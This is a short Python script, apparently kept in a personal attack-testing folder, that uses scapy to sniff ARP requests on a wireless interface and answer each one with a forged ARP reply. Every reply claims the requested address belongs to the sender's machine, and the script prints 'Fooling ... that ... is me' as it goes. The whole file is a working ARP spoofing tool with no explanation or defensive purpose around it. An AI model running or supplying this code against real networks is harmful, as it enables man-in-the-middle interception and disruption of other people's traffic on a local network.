'''
sudo python /home/mxr/Desktop/python-files/cyber-attack-test/arper/arper_pro.py
'''

from scapy.all import ARP, Ether, sendp, sniff

def respond(pkt):
    # have I got an ARP request? 
    if pkt[ARP].op == 1:
        answer = Ether(dst=pkt[ARP].hwsrc) / ARP(op=2)
        answer[ARP].hwdst = pkt[ARP].hwsrc
        answer[ARP].psrc = pkt[ARP].pdst
        answer[ARP].pdst = pkt[ARP].psrc

        print(f'Fooling {pkt[ARP].psrc} that {pkt[ARP].pdst} is me')

        sendp(answer, iface='wlan0')

if __name__ == '__main__':
    sniff(prn=respond, filter='arp', iface='wlan0', store=0)